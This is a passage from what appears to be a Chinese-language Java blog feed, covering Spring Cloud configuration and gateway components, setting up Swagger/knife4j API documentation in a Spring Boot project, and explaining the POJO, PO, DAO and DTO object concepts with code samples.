<p>resilience4j.circuitbreaker:<br>  instances:<br>    backendService:<br>      failureRateThreshold: 50 # 失败率阈值%<br>      slidingWindowSize: 10 # 滑动窗口大小<br>      minimumNumberOfCalls: 5 # 最小调用数<br>      waitDurationInOpenState: 5000 # 打开状态等待时间(ms)<br>      permittedNumberOfCallsInHalfOpenState: 3 # 半开状态允许试探请求数</p>
<p>使用注解 @CircuitBreaker(name &#x3D; “backendService”, fallbackMethod &#x3D; “fallback”)</p>
<p>@Service<br>public class MyService {<br>    @CircuitBreaker(name &#x3D; “backendService”, fallbackMethod &#x3D; “fallbackMethod”)<br>    public String callExternalService() {<br>        &#x2F;&#x2F; 调用可能失败的外部服务<br>    }<br>    private String fallbackMethod(Exception ex) {<br>        return “Fallback response due to: “ + ex.getMessage();<br>    }<br>}</p>
<h2 id="统一配置中心：Spring-Cloud-Config-Nacos-Config"><a href="#统一配置中心：Spring-Cloud-Config-Nacos-Config" class="headerlink" title="统一配置中心：Spring Cloud Config &#x2F; Nacos Config"></a>统一配置中心：Spring Cloud Config &#x2F; Nacos Config</h2><ul>
<li><p>功能： 集中管理微服务应用的所有环境配置（如数据库连接、消息队列地址、业务参数）。实现配置与代码分离、配置动态刷新、环境配置隔离（dev, test, prod）、版本管理、审计等功能。</p>
</li>
<li><p>核心概念：</p>
</li>
</ul>
<p>配置服务器 (Config Server)： 集中存储配置文件的中心服务。支持多种后端存储：Git（常用）、SVN、本地文件系统、数据库、Consul、Nacos 等。</p>
<p>配置客户端 (Config Client)： 微服务应用，启动时从 Config Server 获取自己所需的配置信息。</p>
<p>配置仓库 (Repository)： 如 Git 仓库，实际存储配置文件的地方。</p>
<p>配置文件命名： {application}-{profile}.{extension} (e.g., user-service-dev.yml, order-service-prod.properties).</p>
<ul>
<li>工作流程：</li>
</ul>
<p>启动 Config Server，配置其指向 Git 等后端仓库。</p>
<p>微服务 (Config Client) 启动时，根据 bootstrap.yml (优先级高于 application.yml) 中配置的 spring.application.name 和 spring.profiles.active，向 Config Server 请求对应配置（如 user-service-dev.yml）。</p>
<p>Config Server 从配置仓库（如 Git）拉取配置并返回给 Client。</p>
<p>Client 使用获取到的配置启动应用。</p>
<p>(动态刷新) 当配置仓库中的文件改变：</p>
<p>手动刷新： 对 Client 发送 POST &#x2F;actuator&#x2F;refresh 端点（需要 spring-boot-starter-actuator 和暴露端点）。</p>
<p>自动刷新 (更优)： 结合 Spring Cloud Bus (消息总线，如 RabbitMQ&#x2F;Kafka)，Config Server 监听到仓库变更后，通过 Bus 广播刷新事件，所有订阅该事件的 Client 自动刷新配置。或者使用 Nacos Config 自身的监听机制。</p>
<ul>
<li>Spring Cloud Config vs Nacos Config：</li>
</ul>
<p>Spring Cloud Config： Spring Cloud 原生方案，与 Git 集成好，功能成熟。</p>
<p>Nacos Config： 作为 Nacos 的一部分，同时支持服务发现和配置管理。提供更友好的 UI 控制台，配置动态刷新更高效便捷（基于长轮询或 UDP），支持更多数据类型（如 Properties, YAML, JSON, TEXT, XML, HTML），是当前主流推荐。</p>
<h2 id="服务网关：Spring-Cloud-Gateway"><a href="#服务网关：Spring-Cloud-Gateway" class="headerlink" title="服务网关：Spring Cloud Gateway"></a>服务网关：Spring Cloud Gateway</h2><ul>
<li>功能： 所有外部请求的统一入口，扮演“门卫”角色。核心功能包括：</li>
</ul>
<p>路由 (Routing)： 根据请求路径、Header、参数等条件，将请求转发到相应的微服务实例。</p>
<p>断言 (Predicate)： 定义路由匹配的条件（Java 8 Predicate）。</p>
<p>过滤器 (Filter)： 在请求转发前或响应返回后，执行特定逻辑（如添加&#x2F;删除 Header、鉴权、限流、日志记录、修改请求&#x2F;响应体）。分为 GatewayFilter (作用于单个路由) 和 GlobalFilter (作用于所有路由)。</p>
<p>负载均衡： 集成 LoadBalancerClient (底层是 Ribbon&#x2F;SC LoadBalancer)，在网关层实现服务实例的负载均衡。</p>
<p>限流： 集成如 Redis + Lua、Sentinel 实现 API 限流。</p>
<p>鉴权： 集成 Spring Security、OAuth2 实现统一身份认证和授权。</p>
<p>熔断： 集成 Resilience4j 或 Sentinel 实现网关层面的熔断降级。</p>
<ul>
<li>核心优势 (vs Zuul 1.x)：</li>
</ul>
<p>异步非阻塞： 基于 Project Reactor (Netty) 实现，性能更高，适合高并发场景。</p>
<p>功能强大且灵活： 提供丰富的 Predicate 和 Filter API，易于扩展。</p>
<p>官方推荐： Spring Cloud 官方推出的网关，是 Zuul 1.x 的替代者。</p>
<ul>
<li>配置示例 (application.yml):</li>
</ul>
<p>spring:<br>  cloud:<br>    gateway:<br>      routes:<br>        - id: user_route # 路由 ID<br>          uri: lb:&#x2F;&#x2F;user-service # 目标服务 URI (lb:&#x2F;&#x2F; 表示负载均衡)<br>          predicates: # 断言 (条件)<br>            - Path&#x3D;&#x2F;api&#x2F;users&#x2F;**<br>          filters: # 过滤器<br>            - StripPrefix&#x3D;1 # 去掉前缀 &#x2F;api<br>            - AddRequestHeader&#x3D;X-Request-Foo, Bar # 添加请求头</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/SpringCloud/summary.png" alt="总结表"><br>重要说明：</p>
<p>版本演进： Spring Cloud 版本迭代较快（如 Hoxton, 2020.0.x, 2021.0.x, 2022.0.x, 2023.0.x），不同版本默认或推荐的组件可能不同（如从 Ribbon -&gt; SC LoadBalancer, Hystrix -&gt; Resilience4j&#x2F;Sentinel, Zuul -&gt; Gateway）。选择时需关注官方文档和组件活跃度。</p>
<p>Spring Cloud Alibaba： 提供了一套基于 Spring Cloud 标准的 Alibaba 中间件集成（Nacos, Sentinel, Seata, RocketMQ 等），在中国市场非常流行，是构建微服务的重要选择。</p>
<p>其他重要组件：</p>
<p>Spring Cloud Bus： 消息总线，用于广播配置更改（如配合 Config）或状态更改。</p>
<p>Spring Cloud Sleuth &#x2F; Zipkin： 分布式链路追踪，用于监控和诊断跨服务调用的性能问题。</p>
<p>Spring Cloud Security： 提供 OAuth2、单点登录 (SSO) 等安全功能。</p>
<p>Seata： Alibaba 开源的分布式事务解决方案 (AT, TCC, SAGA, XA 模式)。</p>
<p>掌握这六大核心组件及其交互，是理解和构建 Spring Cloud 微服务架构的基础。实际项目中，根据具体需求选择合适的组件组合及其版本。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Swagger</title>
    <url>/2024/08/17/Swagger/</url>
    <content><![CDATA[<h1 id="Swagger"><a href="#Swagger" class="headerlink" title="Swagger"></a>Swagger</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>使用Swagger你只需要按照它的规范去定义接口及接口相关的信息，再通过Swagger衍生出来的一系列项目和工具就可以做到生成各种格式的接口文档，以及在线接口调试页面等等，<br><a href="https://swagger.io/">官网</a></p>
<p>knife4j是为Java MVC框架集成Swagger生成Api文档的增强解决方案。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.xiaoymin<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>knife4j-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><p>操作步骤:<br>1、导入knife4j的maven坐标</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.xiaoymin<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>knife4j-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2、导入knife4j相关配置类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableSwagger2</span></span><br><span class="line"><span class="meta">@EnableKnife4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebMvcConfig</span> <span class="keyword">extends</span> <span class="title class_">WebMvcConfigurationSupport</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置静态资源映射</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> registry</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">addResourceHandlers</span><span class="params">(ResourceHandlerRegistry registry)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;开始进行静态资源映射...&quot;</span>);</span><br><span class="line">        registry.addResourceHandler(<span class="string">&quot;doc.html&quot;</span>).addResourceLocations(<span class="string">&quot;classpath:/META-INF/resources/&quot;</span>);</span><br><span class="line">        registry.addResourceHandler(<span class="string">&quot;/webjars/**&quot;</span>).addResourceLocations(<span class="string">&quot;classpath:/META-INF/resources/webjars/&quot;</span>);</span><br><span class="line">        registry.addResourceHandler(<span class="string">&quot;/backend/**&quot;</span>).addResourceLocations(<span class="string">&quot;classpath:/backend/&quot;</span>);</span><br><span class="line">        registry.addResourceHandler(<span class="string">&quot;/front/**&quot;</span>).addResourceLocations(<span class="string">&quot;classpath:/front/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 扩展mvc框架的消息转换器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> converters</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">extendMessageConverters</span><span class="params">(List&lt;HttpMessageConverter&lt;?&gt;&gt; converters)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;扩展消息转换器...&quot;</span>);</span><br><span class="line">        <span class="comment">//创建消息转换器对象</span></span><br><span class="line">        <span class="type">MappingJackson2HttpMessageConverter</span> <span class="variable">messageConverter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MappingJackson2HttpMessageConverter</span>();</span><br><span class="line">        <span class="comment">//设置对象转换器，底层使用Jackson将Java对象转为json</span></span><br><span class="line">        messageConverter.setObjectMapper(<span class="keyword">new</span> <span class="title class_">JacksonObjectMapper</span>());</span><br><span class="line">        <span class="comment">//将上面的消息转换器对象追加到mvc框架的转换器集合中</span></span><br><span class="line">        converters.add(<span class="number">0</span>,messageConverter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Docket <span class="title function_">createRestApi</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 文档类型</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class="line">                .apiInfo(apiInfo())</span><br><span class="line">                .select()</span><br><span class="line">                .apis(RequestHandlerSelectors.basePackage(<span class="string">&quot;com.lzj.system.controller&quot;</span>))</span><br><span class="line">                .paths(PathSelectors.any())</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ApiInfo <span class="title function_">apiInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ApiInfoBuilder</span>()</span><br><span class="line">                .title(<span class="string">&quot;后台管理系统&quot;</span>)</span><br><span class="line">                .version(<span class="string">&quot;1.0&quot;</span>)</span><br><span class="line">                .description(<span class="string">&quot;后台管理系统文档&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3、设置静态资源，否则接口文档页面无法访问</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">registry.addResourceHandler(<span class="string">&quot;doc.html&quot;</span>).addResourceLocations(<span class="string">&quot;classpath:/META-INF/resources/&quot;</span>);</span><br><span class="line">registry.addResourceHandler(<span class="string">&quot;/webjars/**&quot;</span>).addResourceLocations(<span class="string">&quot;classpath:/META-INF/resources/webjars/&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>4、在LoginCheckFilter中设置不需要处理的请求路径</p>
<p>放行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">		<span class="comment">// 定义不需要拦截的路径</span></span><br><span class="line">        String[] urls = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">                <span class="string">&quot;/employee/login&quot;</span>,</span><br><span class="line">                <span class="string">&quot;/employee/logout&quot;</span>,</span><br><span class="line"><span class="comment">//                &quot;/employee/page&quot;,</span></span><br><span class="line">                <span class="string">&quot;/backend/**&quot;</span>,</span><br><span class="line">                <span class="string">&quot;/front/**&quot;</span>,</span><br><span class="line">                <span class="string">&quot;/common/**&quot;</span>,</span><br><span class="line">                <span class="string">&quot;/user/sendMsg&quot;</span>,</span><br><span class="line">                <span class="string">&quot;/user/login&quot;</span>,</span><br><span class="line">                <span class="string">&quot;/doc.html&quot;</span>,</span><br><span class="line">                <span class="string">&quot;/webjars/**&quot;</span>,</span><br><span class="line">                <span class="string">&quot;/swagger-resources/**&quot;</span>,</span><br><span class="line">                <span class="string">&quot;/v2/api-docs&quot;</span></span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
<h2 id="访问网址"><a href="#访问网址" class="headerlink" title="访问网址"></a>访问网址</h2><p><a href="http://localhost:8080/doc.html#/home">http://localhost:8080/doc.html#/home</a> 访问这个网站就能看到接口了</p>
<h2 id="常用注解"><a href="#常用注解" class="headerlink" title="常用注解"></a>常用注解</h2><table>
<thead>
<tr>
<th>注解</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>@Api</td>
<td>用在请求的类上，例如Controller，表示对类的说明</td>
</tr>
<tr>
<td>@ApiModel</td>
<td>用在类上，通常是实体类，表示一个返回响应数据的信息</td>
</tr>
<tr>
<td>@ApiModelProperty</td>
<td>用在属性上，描述响应类的属性</td>
</tr>
<tr>
<td>@ApiOperation</td>
<td>用在请求的方法上，说明方法的用途、作用</td>
</tr>
<tr>
<td>@ApilmplicitParams</td>
<td>用在请求的方法上，表示一组参数说明</td>
</tr>
<tr>
<td>@ApilmplicitParam</td>
<td>用在@ApilmplicitParams注解中，指定一个请求参数的各个方面</td>
</tr>
</tbody></table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 套餐实体类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@ApiModel(&quot;套餐&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Setmeal</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;套餐id&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//分类id</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;分类id&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Long categoryId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 套餐管理controller</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/setmeal&quot;)</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Api(tags = &quot;套餐管理&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SetmealController</span> &#123;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 套餐分页查询</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/page&quot;)</span></span><br><span class="line">    <span class="meta">@ApiOperation(&quot;套餐分页查询&quot;)</span></span><br><span class="line">    <span class="meta">@ApiImplicitParams(&#123;</span></span><br><span class="line"><span class="meta">            @ApiImplicitParam(name = &quot;page&quot;, value = &quot;当前页码&quot;, required = true, dataType = &quot;int&quot;, paramType = &quot;query&quot;),</span></span><br><span class="line"><span class="meta">            @ApiImplicitParam(name = &quot;pageSize&quot;, value = &quot;每页显示的记录数&quot;, required = true, dataType = &quot;int&quot;, paramType = &quot;query&quot;),</span></span><br><span class="line"><span class="meta">            @ApiImplicitParam(name = &quot;name&quot;, value = &quot;套餐名称&quot;, required = false, dataType = &quot;String&quot;, paramType = &quot;query&quot;)</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    <span class="keyword">private</span> R&lt;Page&gt; <span class="title function_">page</span><span class="params">(<span class="type">int</span> page, <span class="type">int</span> pageSize, String name)</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>概念POJO、DTO、DAO、PO、BO、VO、QO、ENTITY详解</title>
    <url>/2024/08/15/%E6%A6%82%E5%BF%B5POJO%E3%80%81DTO%E3%80%81DAO%E3%80%81PO%E3%80%81BO%E3%80%81VO%E3%80%81QO%E3%80%81ENTITY%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<p>在Java开发过程中，新手总是被DAO、PO、BO、VO等等概念弄得晕头转向。<br>下面我查找了很多资料，总结如下：</p>
<h1 id="一、POJO（Plain-Ordinary-Java-Object-简单Java对象）"><a href="#一、POJO（Plain-Ordinary-Java-Object-简单Java对象）" class="headerlink" title="一、POJO（Plain Ordinary Java Object 简单Java对象）"></a>一、POJO（Plain Ordinary Java Object 简单Java对象）</h1><p>实际就是普通JavaBeans，是为了避免和EJB（Enterprise Java Beans 企业级JavaBeans）混淆所创造的简称，也称为（Plain Old Java Object 又普通又老的对象）。</p>
<p>相比于EJB来说，的确是老的对象，因为ORM中间件的日趋流行，POJO又重新焕发了光彩。</p>
<p>POJO的内在含义是指：那些没有继承任何类、也没有实现任何接口，更没有被其它框架侵入的java对象。<br>它仅包含自身的属性以及自身属性的getter和setter方法，这意味者POJO可以方便的从一个框架迁移到另一个框架中，或者框架升级也会对代码毫无影响，因此而得到复用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//例如在该实体EJB中，实体包含业务逻辑，同时也包含自身的持久化逻辑</span></span><br><span class="line"><span class="comment">//当更换数据源，或改变中间件框架时，则需要修改大量代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Customer</span> &#123;</span><br><span class="line">	<span class="keyword">private</span> Long id;</span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	<span class="keyword">private</span> Set&lt;Order&gt; orders = <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">	<span class="comment">//省略业务逻辑</span></span><br><span class="line">	<span class="comment">//数据库访问方法</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="comment">//通过不同方式访问数据库，例如JDBC，Mybaits，JPA</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> Customer <span class="title function_">load</span><span class="params">()</span>&#123;...&#125;</span><br><span class="line">	<span class="keyword">public</span> Customer <span class="title function_">create</span><span class="params">()</span>&#123;...&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//当改为POJO时，则可以运行在任一JAVA环境中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Customer</span> &#123;</span><br><span class="line">	<span class="keyword">private</span> Long id;</span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	<span class="keyword">private</span> Set&lt;Order&gt; orders = <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">	<span class="comment">//省略getter和setter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一般，当需要持久化对象时，人们喜欢将该对象放在名为xxxPOJO的目录中。当然，不建议这样命名。<br>POJO实际上是包括BO&#x2F;VO&#x2F;PO&#x2F;DO等一系列对象的总称。有的团队规定禁止命名成xxxPOJO。</p>
<h1 id="二、PO-persistence-object-持久层对象"><a href="#二、PO-persistence-object-持久层对象" class="headerlink" title="二、PO(persistence object 持久层对象)"></a>二、PO(persistence object 持久层对象)</h1><p>对象字段持有的数据需要被持久化到数据表中，参与到持久化操作的对象就被称为持久化对象(persistence object，PO)。</p>
<p>通常，PO是在ORM（对象关系映射）中与数据表的一条记录相匹配，自身属性与数据表字段一一对应。可以将数据表中的一条记录作为一个对象处理，并可以转化为其它对象。</p>
<p>面对不同的数据源时，比如文档型数据库，对象型数据库等时，顾名思义PO是DAO层为进行持久化操作而准备的对象。</p>
<p>包含getter、setter方法。<br>一般不包含业务逻辑与数据库的访问方法。因为数据库本身不包含业务逻辑。<br>PO平常不一定需要实现序列化，只是当采用分布式存储或者需要作为前端输出及远程调用使用时，应该实现序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//示例代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="comment">//序列化版本，通过IDEA自动生成</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialiVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>；</span><br><span class="line">	<span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;    </span><br><span class="line">    <span class="comment">//省略getter和setter方法</span></span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>
<p>注意，持久化对象并不一定就是ORM机制（对象关系映射）的数据对象，相反，在领域驱动设计中，持久化对象往往指的就是领域模型对象。</p>
<p>在《阿里巴巴开发手册》中，PO也叫DO（Data Object）数据对象，与数据库表结构一一对应，通过DAO层向上传输数据源对象。</p>
<h1 id="三、DAO-data-access-object-数据访问对象"><a href="#三、DAO-data-access-object-数据访问对象" class="headerlink" title="三、DAO(data access object 数据访问对象)"></a>三、DAO(data access object 数据访问对象)</h1><p>包含对数据的访问，负责持久层的操作 。通常需要结合PO来访问数据库，主要用来封装对数据的访问，并不转化成其它对象。<br>在基于“事务脚本”的业务设计时，它包含业务逻辑。否则，一般只包含持久化的封装。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Dao</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">insert</span><span class="params">(User user)</span>;</span><br><span class="line">    User <span class="title function_">selectById</span><span class="params">(<span class="type">long</span> id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="四、DTO（Data-Transfer-Object-数据传输对象）"><a href="#四、DTO（Data-Transfer-Object-数据传输对象）" class="headerlink" title="四、DTO（Data Transfer Object 数据传输对象）"></a>四、DTO（Data Transfer Object 数据传输对象）</h1><p>数据传输对象，是在应用网络层需要传输的对象，是一个为了减少方法调用次数而在进程间传输数据的对象。</p>
<p>在《阿里巴巴开发手册中》规定是Service 或 Manager 向外传输的对象。</p>
<blockquote>
<p>DTO模式诞生的背景是分布式通信。考虑到网络传输的损耗与不可靠性，设计分布式服务需遵循一个总体原则：尽可能设计粗粒度的服务，每个服务的方法应代表一个完整的功能，而不是功能的一个步骤。粗粒度服务可以减少服务调用的次数，从而减少不必要的网络通信，同时也能避免对分布式事务的支持。<br>某些人称这个为“值对象”，当然还是有稍许区别。值对象追求对象不可变，DTO的对象是可修改，可改变的。</p>
</blockquote>
<h2 id="什么是DTO"><a href="#什么是DTO" class="headerlink" title="什么是DTO?"></a>什么是DTO?</h2><p>从输入来看，在进行请求时，应用在接口接收传入对象，然后又转换成实体进行持久化。在此过程中，传入的对象就是DTO。<br>它的命名方式可能是Param、Query 、Command、等。Param 为查询参数对象，适用于各层，一般用做接受前端参数对象。Param 和 Query 的出现是为了不使用 Map 做为接收参数的对象。<br>从输出来看，在进行返回响应时，若数据表有100个字段，那么PO中就有100个属性，而界面可能只需要其中10个属性，那么查询数据库后，对象就需要由PO转化成DTO。<br>DTO可能还需要组合多个表查询到的对象成为一个大对象，以便减少网络的调用，或者给前端传输一些不在数据库中查到的属性，所以需要添加属性。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//示例代码，继承实体类，从查询到的PO中添加属性返回给前端</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDTO</span> <span class="keyword">extends</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="comment">//序列化版本</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialiVersionUID</span> <span class="operator">=</span> <span class="number">2L</span>；</span><br><span class="line">    <span class="comment">//用户标识</span></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span>&#123;<span class="keyword">return</span> username;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span>&#123;<span class="built_in">this</span>.username= username;&#125;</span><br><span class="line">    <span class="comment">//添加额外属性</span></span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;String, Object&gt; extProperties;        </span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;String, Object&gt; <span class="title function_">getExtProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> extProperties;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setExtProperties</span><span class="params">(HashMap&lt;String, Object&gt; extProperties)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.extProperties = extProperties;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="DTO里面有什么？"><a href="#DTO里面有什么？" class="headerlink" title="DTO里面有什么？"></a>DTO里面有什么？</h2><p>一般不建议创建DTO，因为里面就一些属性和getter、setter方法，业务价值小，作用仅仅是在一次调用中传输几部分信息。<br>其中，属性必须为原始数据类型，因为DTO需要被序列化以便能在连接中传播。<br>它只包含自身数据的存储，而不包含业务逻辑。<br>在不同的客户端之间，通常需要DTO组装器完成领域对象和DTO之间的转化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">DTOAssembler</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> DTO <span class="title function_">createDTO</span><span class="params">(DO domainObject)</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateDO</span><span class="params">(DTO  dataTransferObject)</span>;</span><br><span class="line">	<span class="keyword">public</span> DO <span class="title function_">createDO</span><span class="params">(DTO  dataTransferObject)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="DTO怎么使用？"><a href="#DTO怎么使用？" class="headerlink" title="DTO怎么使用？"></a>DTO怎么使用？</h2><p>对于不同的客户端展现，可以选择一次封装所有可能的数据组成DTO，也可以为每种展现创建不同的DTO。各有利弊。</p>
<ul>
<li>单个大DTO，减少调用次数，只用创建一次，但是难以掌握传输的数据</li>
<li>不同的小DTO，要创建很多DTO，传输数据很清晰</li>
<li>对于输入方和输出方，可以共用一个DTO，也可以各准备一个DTO，视情况而定。</li>
</ul>
<p>有部分团队 RPC 的请求和响应参数都通过 DTO 来承载，通过 XXRequestDTO 和 XXResponseDTO 来表示。</p>
